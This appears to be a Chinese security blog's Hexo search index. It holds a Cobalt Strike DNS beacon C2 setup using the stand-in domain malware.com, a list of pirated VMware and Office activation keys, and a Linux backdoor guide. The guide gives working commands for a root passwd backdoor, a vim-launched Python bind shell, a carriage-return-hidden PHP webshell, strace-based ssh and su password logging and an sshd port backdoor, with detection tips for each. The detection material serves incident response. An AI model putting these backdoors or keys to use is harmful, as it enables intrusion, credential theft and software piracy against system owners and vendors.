<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>cobaltstrike dns beacon</title>
      <link href="/2020/04/05/cobaltstrike-dns-beacon/"/>
      <url>/2020/04/05/cobaltstrike-dns-beacon/</url>
      <content type="html"><![CDATA[<p><img src="/2020/04/05/cobaltstrike-dns-beacon/cs.png" alt=""></p><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul><li>cs作者曾说过dns beacon是cs一重要特色，其原因在于绕过防火墙方面比较有优势，之前测试的时候有点儿问题也没有深入研究原理，在最新的cs4.0出来之后又重新测试了一下，然鹅过程是崎岖的，中间踩了几个坑记录一下。<h2 id="原理简介"><a href="#原理简介" class="headerlink" title="原理简介"></a>原理简介</h2></li><li>首先我们需要申请一个域名配置好域名解析，例如这里的域名是 malware.com, vps ip地址1.2.3.4，我们需要设置dns的一个A记录，将malware.com的一个子域名指向我们的vps地址，如c2.malware.com</li><li>之后我们需要添加一个NS(name server)记录,主机记录可以是dns,记录值是c2.malware.com,NS记录就是将解析任务交由一个指定的”权威”dns服务器(在这里teamserver就是我们的”权威”dns)</li><li>梳理一下流程，当我们请求data.dns.malware.com的时候，首先通过递归查询查找到malware.com,之后发现dns.malware.com是由c2.malware.com负责解析，然后这个c2.malware又有A记录,对应ip地址是1.2.3.4，这个时候就可以和1.2.3.4通信了，注意这里需要事先在teamserver上配置dns listener(cs中listener的dns hosts设置为dns.malware.com)，否则无法处理过来的dns请求。<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2></li><li>原理明白测试就简单了，配置好cs的dns listener和dns解析之后可以进行一下解析测试，使用dig或nslookup命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dig +trace dns.malware.com</span><br><span class="line">nslookup dns.malware.com c2.malware.com</span><br></pre></td></tr></table></figure></li></ul><p>一般会收到来自teamserver 53端口的默认回复地址0.0.0.0，但如果你的cs配置了profile，且设置了dns_idle,那就不是默认的0.0.0.0，而是你dns_idle的值，这个是cs作者用来逃避检测的一种技巧，只能说作者考虑的有点儿全面orz (之前测试的时候我一直没注意到这个点，一直不明白自己为啥总是返回8.8.8.8，简单逆了一下cobaltstrike.jar 大概看下流程也没怎么看懂，也看了teamserve的log除了几个warning也没什么特别的异常，在服务器上抓了流量也没发现异常，也排除了vps限制或者是dns厂商问题，总之各种弯路都走了…最后事实证明这些都是正常的,是自己在启动teamserver的时候自定义了profile里面的dns_idle为8.8.8.8，害！)。<br><img src="/2020/04/05/cobaltstrike-dns-beacon/profile.png" alt=""></p><ul><li>在beacon上线之后，图标是个黑框，且和http和tcp beacon不一样它没有默认的睡眠60秒，你甚至可能会以为beacon死掉了，其实不然如果想要和beacon交互这个时候需要checkin命令，help checkin可以看到帮助信息，大意就是会让dns beacon强制回连你的teamserver,checkin之后就会发现图标变了，也可以进行交互了，但非常慢，有时候甚至还连不回来，这个时候需要修改一下dns模式，help mode可以看一下具体有什么不同,默认的mode dns数据传输比较慢，可以修改为mode dns-txt 这样传输会快点儿，每次传输189比特的数据，相比A记录每次传输4比特的数据快很多了。<br><img src="/2020/04/05/cobaltstrike-dns-beacon/help.png" alt=""><br><img src="/2020/04/05/cobaltstrike-dns-beacon/checkin.png" alt=""><br>至此，踩坑完毕。。。<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><a href="https://blog.cobaltstrike.com/2016/07/29/cobalt-strike-3-4-operational-details/" target="_blank" rel="noopener">New Malleable C2 Options</a><br><a href="https://www.i0day.com/1957.html" target="_blank" rel="noopener">Cobalt Strike 3.13</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>2019-note</title>
      <link href="/2019/11/14/2019-note/"/>
      <url>/2019/11/14/2019-note/</url>
      <content type="html"><![CDATA[<h2 id="记录一些乱七八糟的"><a href="#记录一些乱七八糟的" class="headerlink" title="记录一些乱七八糟的"></a>记录一些乱七八糟的</h2><ul><li>free hackbar <a href="https://github.com/Mr-xn/hackbar2.1.3" target="_blank" rel="noopener">https://github.com/Mr-xn/hackbar2.1.3</a></li><li>一些vmware的镜像 <a href="https://github.com/LubyRuffy/VmwareImages" target="_blank" rel="noopener">https://github.com/LubyRuffy/VmwareImages</a></li><li>kali下载地址 <a href="http://dl1.thehackerplaybook.com/THP-vm.zip" target="_blank" rel="noopener">http://dl1.thehackerplaybook.com/THP-vm.zip</a>  账号密码：root toor</li><li>吾爱破解论坛【破解专用虚拟机2.0】<a href="https://www.52pojie.cn/thread-661779-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-661779-1-1.html</a></li><li>office 2010的下载链接：ed2k://|file|en_office_professional_plus_2010_x64_515489.exe|753387136|5BFA4237E2999DA93DB60FBC6131C12D|/，以及激活码：6QFDX-PYH2G-PPYFD-C7RJM-BBKQ8</li><li>linux ubuntu Forensics  <a href="https://ftp.nluug.nl/os/Linux/distr/tsurugi/01.Tsurugi_Linux_%5bLAB%5d/TSURUGI_LINUX_2019.1.ova" target="_blank" rel="noopener">https://ftp.nluug.nl/os/Linux/distr/tsurugi/01.Tsurugi_Linux_%5bLAB%5d/TSURUGI_LINUX_2019.1.ova</a>  tsurugi tsurugi</li><li>DEF CON 26 - Attacking &amp; Auditing Docker Containers Workshop. <a href="https://sourceforge.net/projects/defcon-26-container-security/" target="_blank" rel="noopener">environment</a><br>Complete detailed repository at <a href="https://github.com/appsecco/defcon-26-workshop-attacking-and-auditing-docker-containers" target="_blank" rel="noopener">https://github.com/appsecco/defcon-26-workshop-attacking-and-auditing-docker-containers</a> </li><li>vmware <a href="https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.1-15018445.exe" target="_blank" rel="noopener">https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.1-15018445.exe</a>   激活码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ZC10K-8EF57-084QZ-VXYXE-ZF2XF</span><br><span class="line"></span><br><span class="line">UF71K-2TW5J-M88QZ-8WMNT-WKUY4</span><br><span class="line"></span><br><span class="line">AZ7MK-44Y1J-H819Z-WMYNC-N7ATF</span><br><span class="line"></span><br><span class="line">CU702-DRD1M-H89GP-JFW5E-YL8X6</span><br><span class="line"></span><br><span class="line">YY5EA-00XDJ-480RP-35QQV-XY8F6</span><br><span class="line"></span><br><span class="line">VA510-23F57-M85PY-7FN7C-MCRG0</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>网络安全平台上线啦！！！</title>
      <link href="/2019/09/05/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%B9%B3%E5%8F%B0%E4%B8%8A%E7%BA%BF%E5%95%A6%EF%BC%81%EF%BC%81%EF%BC%81/"/>
      <url>/2019/09/05/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%B9%B3%E5%8F%B0%E4%B8%8A%E7%BA%BF%E5%95%A6%EF%BC%81%EF%BC%81%EF%BC%81/</url>
      <content type="html"><![CDATA[<h3 id="网络安全平台上线啦"><a href="#网络安全平台上线啦" class="headerlink" title="网络安全平台上线啦"></a>网络安全平台上线啦</h3><ul><li>大家好，网络安全平台上线啦，介四里没有挽过的船新版本，挤需体验三番钟，里造会干我一样，爱象戒宽油系，是兄弟就来pwn我(pwnme.cn)，大家来玩叭~</li><li>记住我们的网址是<a href="https://www.pwnme.cn/" target="_blank" rel="noopener">https://www.pwnme.cn/</a><br><img src="/2019/09/05/网络安全平台上线啦！！！/platform1.png" alt=""><br><img src="/2019/09/05/网络安全平台上线啦！！！/platform2.png" alt=""></li><li>平台有时候可能会关掉，如有需求请联系我开启 ：）</li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>linux常见backdoor及排查技术</title>
      <link href="/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/"/>
      <url>/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/</url>
      <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原文已发布至先知平台</span><br><span class="line">linux常见backdoor及排查技术</span><br><span class="line">https://xz.aliyun.com/t/4090</span><br><span class="line">windows常见backdoor、权限维持方法及排查技术</span><br><span class="line">https://xz.aliyun.com/t/4842</span><br></pre></td></tr></table></figure><h2 id="TL；DR"><a href="#TL；DR" class="headerlink" title="TL；DR"></a>TL；DR</h2><p><img src="/2019/02/16/linux常见backdoor及排查技术/backdooropen.jpg" alt=""></p><ul><li>最近遇到一些和后门相关的技术，所以就把之前的linux backdoor相关笔记重新整理和学习了一下。在这里做一下记录，后续有时间整理一下windows backdoor方面的技术。</li><li>在服务器被入侵后进行应急响应无非通过文件排查、网络排查、进程排查、系统信息排查等方法进行入侵排查。下面就一些常见技巧以及公开的工具进行剖析介绍。</li><li>现在有一些公司在发现入侵之后直接重装系统，那么基本所有的后门就无法发挥权限维持的作用了，但作为一个安全从业人员还是需要对一些后门有一个基本的了解。<h2 id="常见技巧"><a href="#常见技巧" class="headerlink" title="常见技巧"></a>常见技巧</h2><h3 id="添加root权限后门用户"><a href="#添加root权限后门用户" class="headerlink" title="添加root权限后门用户"></a>添加root权限后门用户</h3></li><li>/etc/passwd这个文件包含了系统所有的用户名、ID、登录的shell等信息,这个文件是以分号分隔开的，依次是登录名、密码、用户ID、组ID，用户名、用户的根目录以及登录的shell，其中密码处可以是x(代表加密，存放在/etc/shadow文件中)，也可以直接是加密后的密文，此外用户id为0代表用户会是root的权限，这个时候我们的目标就是在这个文件中追加一条，一个带有密文且id为0的账号。</li><li><p>关于密码加密我们可以使用下面的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#密码M0rk</span><br><span class="line">xxx@ubuntu:~/Desktop$ perl -e &apos;print crypt(&quot;M0rk&quot;, &quot;AA&quot;). &quot;\n&quot;&apos;</span><br><span class="line">AAhmo1jgYI0HE</span><br></pre></td></tr></table></figure></li><li><p>所以我们最终想要在passwd文件中的条目是这个样子的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backdoor:AAhmo1jgYI0HE:0:0:me:/root:/bin/bash</span><br></pre></td></tr></table></figure></li><li><p>append the backdoor to passwd file</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;backdoor:AAhmo1jgYI0HE:0:0:me:/root:/bin/bash&quot;&gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2019/02/16/linux常见backdoor及排查技术/passwdbackdoor.png" alt=""></p><ul><li>注意当我们拥有一个命令执行漏洞或写文件漏洞且为root权限，这个时候就可以通过这种方法直接添加用户。</li><li>优点：简单</li><li>缺点：易被检测到</li><li>排查：检查/etc/passwd文件是否有异常<h3 id="nologin后门"><a href="#nologin后门" class="headerlink" title="nologin后门"></a>nologin后门</h3></li><li>目前在其它的文章中还没有看到过，自己想出来的，就是将nologin程序替换为bash，很多时候应急人员查看passwd，发现账户对应的shell为nologin认为就是系统的账号且这个账号是不能远程登陆的或者是登陆之后没有shell的，可能就认为这个账号是安全的，所以我们就可以将nologin设置成bash，并且修改这个账号的密码，如系统自带的backup账号就是一个很好用账户<br><img src="/2019/02/16/linux常见backdoor及排查技术/passwd.png" alt=""><br><img src="/2019/02/16/linux常见backdoor及排查技术/bash.png" alt=""><br><img src="/2019/02/16/linux常见backdoor及排查技术/login.png" alt=""></li><li>优点：简单</li><li>缺点：暂无</li><li>排查：检查nologin是否被替换<h3 id="认证公钥后门"><a href="#认证公钥后门" class="headerlink" title="认证公钥后门"></a>认证公钥后门</h3></li><li>打过redis未授权漏洞的应该都知道里面有一种利用方式就是向服务器authoriezd_keys文件里面写入自己电脑的公钥，这个时候就可以实现免密码登陆。</li><li>优点：简单</li><li>缺点：不太隐蔽</li><li><p>排查：检查每个用户根目录下面authorized_keys文件是否添加了异常了的公钥。</p><h3 id="vim后门"><a href="#vim后门" class="headerlink" title="vim后门"></a>vim后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#enter the mal script directory 、execute the script and then remove the script</span><br><span class="line">cd /usr/lib/python2.7/site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile dir.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f dir.py</span><br></pre></td></tr></table></figure></li><li><p>此方法适用于安装了vim且安装了python扩展(绝大部分默认安装)的linux系统,至于恶意脚本dir.py的内容可以是任何功能的后门。如使用python监听9999端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</span><br><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">import os, threading, sys, time</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">        server=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">        server.bind((&apos;0.0.0.0&apos;,11))</span><br><span class="line">        server.listen(5)</span><br><span class="line">        print &apos;waiting for connect&apos;</span><br><span class="line">        talk, addr = server.accept()</span><br><span class="line">        print &apos;connect from&apos;,addr</span><br><span class="line">        proc = subprocess.Popen([&quot;/bin/sh&quot;,&quot;-i&quot;], stdin=talk,</span><br><span class="line">                stdout=talk, stderr=talk, shell=True)</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2019/02/16/linux常见backdoor及排查技术/vimversion.png" alt=""></p><ul><li>优点：通过查看/proc/<code>pid</code>/cmdline查看不到具体执行了什么命令或恶意脚本。</li><li>缺点：仍可以看到有vim进程</li><li>排查：检测对应vim进程号虚拟目录的map文件是否有python字眼。<br><img src="/2019/02/16/linux常见backdoor及排查技术/vimbackdoor.png" alt=""></li><li>参考文章<a href="https://github.com/jaredestroud/WOTD/blob/master/%5BDARK%5D%20Weapons%20of%20%20Text%20Destruction.pdf" target="_blank" rel="noopener">Weapons of Text Destruction.</a><h3 id="python内存端口监听"><a href="#python内存端口监听" class="headerlink" title="python内存端口监听"></a>python内存端口监听</h3>参考<a href="https://gist.github.com/epinna/8ce25ac36a7710cdd1806764c647cf99" target="_blank" rel="noopener">epinna’s hacked up in-memory Python bindshell.</a></li><li>注意在原脚本基础上可以加上os.setuid(0)，并给python加上suid可以得到root权限的shell <a href="https://threat.tevora.com/a-valiant-effort-at-a-stealthy-backdoor-2/" target="_blank" rel="noopener">ref</a>，此外如果有web服务器，可以在需要的时候才开启端口监听防止端口一直监听被发现，比较stealthy，可参考<a href="https://blog.sevagas.com/HTTP-backdoor-using-POSIX-file-capabilities-and-PHP" target="_blank" rel="noopener">HTTP backdoor using POSIX file capabilities and PHP</a><h3 id="终端解析-r导致的问题"><a href="#终端解析-r导致的问题" class="headerlink" title="终端解析\r导致的问题"></a>终端解析\r导致的问题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;&lt;?=\`\$_POST[good]\`?&gt;\r&lt;?=&apos;PHP Test Page &gt;||&lt;                  &apos;;?&gt;&quot; &gt;/var/www/html/test.php</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2019/02/16/linux常见backdoor及排查技术/echo.png" alt=""><br><img src="/2019/02/16/linux常见backdoor及排查技术/terminal.png" alt=""></p><ul><li>优点：通过终端命令例如cat、more等命令查看不到恶意代码,适合隐藏一句话木马。</li><li>缺点：易被检测，只是通过终端命令查看的时候看不到恶意代码，而通过其它读文件操作或者通过vim编辑的时候仍可以查看恶意代码。</li><li>排查：使用编辑器或者一般的webshell扫描工具即可检测。<h3 id="一些命令导致截断的问题"><a href="#一些命令导致截断的问题" class="headerlink" title="一些命令导致截断的问题"></a>一些命令导致截断的问题</h3></li><li>在使用ps进行进程查看的时候，不知道很多人会不会遇到这种问题，命令很长被截断的问题，终端显示可能美观，会截断较长的命令，比如在使用docker ps -a查看container的时候，可能你的command列会显示不全，那么使用docker ps -a –no-trunc让其显示完全。同样在使用ps命令查看进程的时候，也存在这种问题。可以在其填充大量的空格进行截断，那么就可达到“进程隐藏”的效果。<br><img src="/2019/02/16/linux常见backdoor及排查技术/pscommand.png" alt=""></li><li>其中使用了<a href="https://github.com/chenkaie/junkcode/blob/master/xhide.c" target="_blank" rel="noopener">xhide工具</a>进行进程名的修改。</li><li>优点：简单</li><li>缺点：易被检测到</li><li>排查：通过ps -aux|grep 可疑进程的pid 即可显示完全，或者使用ps aux | less -+S、ps aux | cat或ps aux | most -w等命令进行查看。<h3 id="strace记录ssh登录密码"><a href="#strace记录ssh登录密码" class="headerlink" title="strace记录ssh登录密码"></a>strace记录ssh登录密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh=&apos;strace   -o   /tmp/sshpwd-`date    &apos;+%d%h%m%s&apos;`.log  \</span><br><span class="line"> -e read,write,connect  -s2048 ssh&apos;  </span><br><span class="line">也可记录 su密码 su=&apos;strace   -o   /tmp/sshpwd-`date    &apos;+%d%h%m%s&apos;`.log  \</span><br><span class="line"> -e read,write,connect  -s2048 su&apos;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2019/02/16/linux常见backdoor及排查技术/sshkeyloger.png" alt=""></p><ul><li>优点：改动较小</li><li>缺点：易被检测到</li><li>排查：通过排查shell的配置文件或者alias命令即可发现，例如~/.bashrc和~/.bash_profile文件查看是否有恶意的alias问题。(注意bash_profile是在登录shell执行的，bashrc是在非登录shell执行,即如果你只是想每次在登录的时候让它去执行，这个时候你可以把你的命令写在.bash_profile,如果你想每次打开一个新的终端的时候都去执行，那么应该把命令写在.bashrc中)<h3 id="常见sshd后门"><a href="#常见sshd后门" class="headerlink" title="常见sshd后门"></a>常见sshd后门</h3></li><li><p>一种是建立sshd的软连接方法，开启其它的端口例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /home/su</span><br><span class="line">/home/su -oport=2222</span><br></pre></td></tr></table></figure></li><li><p>优点：简单</p></li><li>缺点：易被检测到</li><li>排查：使用netstat -antlp查看可疑端口，然后ls -l 可执行文件即可。<br><img src="/2019/02/16/linux常见backdoor及排查技术/lssshd.png" alt=""></li><li>另外一种就是通过在openssh源码中插入恶意代码重新编译并替换原有sshd文件。插入的恶意代码可以是将登录成功的用户密码发送到远程服务器或者记录到某个log文件中。</li><li>优点：隐蔽性较好</li><li>缺点：暂无</li><li>排查：这种sshd后门一般可能会有一定的特征，可以通过strings sshd |egrep ‘\d{1,3}.\d{1,3}.‘或者通过strace 查看是否有可疑的写文件操作。</li><li>此外还有一种给openssh打补丁的方式添加ssh后门的方法，具体见<a href="https://www.cnblogs.com/bigdevilking/p/9535427.html" target="_blank" rel="noopener">利用Openssh后门 劫持root密码</a><h3 id="定时任务和开机启动项"><a href="#定时任务和开机启动项" class="headerlink" title="定时任务和开机启动项"></a>定时任务和开机启动项</h3></li><li>一般的挖矿木马喜欢设置定时任务来进行驻留或者进行分时段的挖矿。<br><img src="/2019/02/16/linux常见backdoor及排查技术/crontab.png" alt=""></li><li>排查：一般通过crontab -l命令即可检测到定时任务后门。不同的linux发行版可能查看开机启动项的文件不大相同，Debian系linux系统一般是通过查看/etc/init.d目录有无最近修改和异常的开机启动项。而Redhat系的linux系统一般是查看/etc/rc.d/init.d或者/etc/systemd/system等目录。<br><img src="/2019/02/16/linux常见backdoor及排查技术/init.png" alt=""><h3 id="预加载型动态链接库后门-ld-so-preload"><a href="#预加载型动态链接库后门-ld-so-preload" class="headerlink" title="预加载型动态链接库后门 ld.so.preload"></a>预加载型动态链接库后门 ld.so.preload</h3></li><li>可能有些人不太了解，简单说一下，就是我们在linux下执行某个可执行文件之前，系统会预先加载用户定义的动态链接库的一种技术，这个技术可以重写系统的库函数，导致发生Hijack。<br><img src="/2019/02/16/linux常见backdoor及排查技术/strace.png" alt=""></li><li>如上图所示，strace 命令id的时候可以发现有预先去读取/etc/ld.so.preload文件(也可使用设置LD_PRELAOD环境变量方式)，如果我们将我们事先写好的恶意so文件位置写入ld.so.preload文件，这时就会达到劫持的效果。</li><li>比较好用的工具是Vegile和cub3<br><a href="https://github.com/Screetsec/Vegile/blob/master/Vegile#L112" target="_blank" rel="noopener">Vegile</a><br><a href="https://github.com/mempodippy/cub3" target="_blank" rel="noopener">cub3</a>,这个工具使用了LD_PRELOAD和系统的扩展属性去隐藏文件。</li><li>更多参考：<br><a href="http://www.drupal001.com/2013/02/linux-extended-attributes/" target="_blank" rel="noopener">Linux文件系统扩展属性</a></li><li>其中还有一种是通过修改动态链接器来加载恶意动态链接库的后门，通过替换或者修改动态链接器中的默认预加载配置文件/etc/ld.so.preload路径的rootkit，此方法更加隐蔽，这个方法的较成熟的利用工具是Vlany，github地址<a href="https://github.com/mempodippy/vlany" target="_blank" rel="noopener">https://github.com/mempodippy/vlany</a><br><a href="https://www.freebuf.com/column/162604.html" target="_blank" rel="noopener">警惕利用Linux预加载型恶意动态链接库的后门</a></li><li>优点：可以隐藏文件、网络、进程等。相对于普通用户空间rootkit而言，隐藏性较好，相对于内核模块rootkit来说，兼容性更好，编写难道低</li><li>缺点：暂无</li><li>排查：通过strace命令去跟踪预加载的文件是否为/etc/ld.so.preload，以及文件中是否有异常的动态链接库。以及检查是否设置LD_PRELOAD环境变量等。注意：在进行应急响应的时候有可能系统命令被替换或者关键系统函数被劫持（例如通过预加载型动态链接库后门），导致系统命令执行不正常，这个时候可以下载busybox。下载编译好的对应平台版本的busybox，或者下载源码进行编译通过U盘拷贝到系统上，因为busybox是静态编译的，不依赖于系统的动态链接库，busybox的使用类似如下 busybox ls，busybox ps -a。<h3 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h3></li><li>使用ptrace向进程中注入恶意so文件工具linux-inject，<a href="https://github.com/gaffe23/linux-inject/" target="_blank" rel="noopener">github地址</a><br><img src="/2019/02/16/linux常见backdoor及排查技术/processinject.png" alt=""><br><img src="/2019/02/16/linux常见backdoor及排查技术/evilso.png" alt=""></li><li>优点：隐藏性好</li><li>缺点：编写难度高，可能会有兼容性、被注入进程down掉等问题</li><li>排查：很难<h3 id="内核级rootkit"><a href="#内核级rootkit" class="headerlink" title="内核级rootkit"></a>内核级rootkit</h3></li><li>内核级的rootkit也很多，这里简单推荐一个Diamorphine<br><img src="/2019/02/16/linux常见backdoor及排查技术/lkm.png" alt=""><br><a href="https://github.com/m0nad/Diamorphine" target="_blank" rel="noopener">github地址</a></li><li>优点：隐藏性较好</li><li>缺点：编写难度有点儿高</li><li>排查：可以通过unhide等工具进行排查<br><img src="/2019/02/16/linux常见backdoor及排查技术/unhide.png" alt=""></li><li>此外还有<a href="https://github.com/f0rb1dd3n/Reptile" target="_blank" rel="noopener">Reptile工具</a></li><li><a href="https://github.com/milabs/awesome-linux-rootkits" target="_blank" rel="noopener">awesome-linux-rootkits</a><h3 id="软件后门"><a href="#软件后门" class="headerlink" title="软件后门"></a>软件后门</h3></li><li>除了系统后门，还有针对一些常用软件的后门，比如apache服务器后门</li><li><a href="https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor" target="_blank" rel="noopener">A Backdoor For Apache HTTP Server Written in C</a></li><li><a href="https://forum.90sec.com/t/topic/342" target="_blank" rel="noopener">从零开始打造一款简单的apache module后门</a></li><li><a href="https://github.com/VladRico/apache2_BackdoorMod" target="_blank" rel="noopener">apache2_BackdoorMod</a><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2></li><li>以上介绍了几种backdoor的技巧，只是抛砖引玉，希望有更多人分享你的linux backdoor技巧、Write your own backdoor and MAKE BACKDOOR GREAT AGAIN : ）<br><img src="/2019/02/16/linux常见backdoor及排查技术/guli.jpg" alt=""><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><a href="https://attack.mitre.org/techniques/T1156/" target="_blank" rel="noopener">ATT&amp;CK Persistence</a><br><a href="https://nnc3.com/mags/LM10/Magazine/Archive/2007/77/022-028_backdoors/article.html" target="_blank" rel="noopener">Techniques for building a hidden backdoor</a><br><a href="https://github.com/d30sa1/RootKits-List-Download" target="_blank" rel="noopener">linux rootkits</a><br><a href="https://github.com/mfontanini/Programs-Scripts/" target="_blank" rel="noopener">https://github.com/mfontanini/Programs-Scripts/</a><br><a href="https://github.com/f0rb1dd3n/Reptile" target="_blank" rel="noopener">Reptile</a><br><a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">icmpsh</a><br><a href="https://isec.ne.jp/wp-content/uploads/2017/11/74LKM-rootkits-1.pdf" target="_blank" rel="noopener">Diamorphine</a><br><a href="https://github.com/CoolerVoid/HiddenWall" target="_blank" rel="noopener">HiddenWall</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>笔记之docker的使用</title>
      <link href="/2018/09/26/%E7%AC%94%E8%AE%B0%E4%B9%8Bdocker%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2018/09/26/%E7%AC%94%E8%AE%B0%E4%B9%8Bdocker%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<p><img src="/2018/09/26/笔记之docker的使用/docker-friends.png" alt=""></p><h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul><li>好久没有更新了，主要比较忙：(   以前只是简单的使用，前段时间相对较”近距离”接触了下docker，发现用来搭建漏洞环境真的很方便。尤其是Dockerfile和docker-compose分别用来构建定制镜像和管理多个容器的功能让我非常惊讶，当然期间也踩了一些坑，把这些坑记录一下。<h4 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h4></li><li>什么是docker，docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。<br><img src="/2018/09/26/笔记之docker的使用/itdevelop.png" alt=""></li><li>如上图所示计算机的发展经历了从物理机到虚拟机的过程，最后出现了共享底层OS的容器。</li><li>docker里面有两个概念需要稍微理解一下，Image(镜像)和Container(容器)，他们两个的关系就像是面向对象程序设计中的 类 和 实例 一样，镜像是静态的定义，容器是镜像运行时的实体。</li><li><a href="https://github.com/widuu/chinese_docker/blob/master/installation/mac.md" target="_blank" rel="noopener">Docker在Mac上的基本安装</a><h4 id="基本常用命令"><a href="#基本常用命令" class="headerlink" title="基本常用命令"></a>基本常用命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">docker images 查看当前的镜像</span><br><span class="line">docker ps -a 查看当前的容器</span><br><span class="line">docker ps -a 有时候我们想要看完整的COMMAND的时候 可以添加参数   - - no-trunc</span><br><span class="line">docker exec -i -t CONTAINER ID  /bin/bash 进入对应容器</span><br><span class="line">docker start/stop/rm CONTAINER ID  开始/停止/删除某个容器</span><br><span class="line">docker rmi -f  IMAGE ID 强制删除某个镜像</span><br><span class="line">docker stop $(docker ps -aq) 停止所有容器</span><br><span class="line">docker rm $(docker ps -aq)  删除所有容器</span><br><span class="line">docker rmi $(docker images -q) 删除所有镜像</span><br><span class="line">docker search xxx 查找xxx镜像</span><br><span class="line">docker pull xxx 获取xxx镜像 默认是latest</span><br><span class="line">docker build .  寻找当前目录下的dockerfile并且生成自定义镜像</span><br><span class="line">docker-compose build --no-cache 每次构建的时候不使用cache 或者在写dockerfile的时候添加或者修改一条无关紧要的命令，这样也会强制build，而不使用cache</span><br></pre></td></tr></table></figure></li></ul><p>以上是常用的命令，还有就是跟着<a href="https://yeasy.gitbooks.io/docker_practice/introduction/why.html" target="_blank" rel="noopener">Docker — 从入门到实践</a>基本操作一下没什么问题。</p><h4 id="Tips-之Dockerfile和docker-compose"><a href="#Tips-之Dockerfile和docker-compose" class="headerlink" title="Tips 之Dockerfile和docker-compose"></a>Tips 之Dockerfile和docker-compose</h4><ul><li><p>docker-compose helloworld版</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 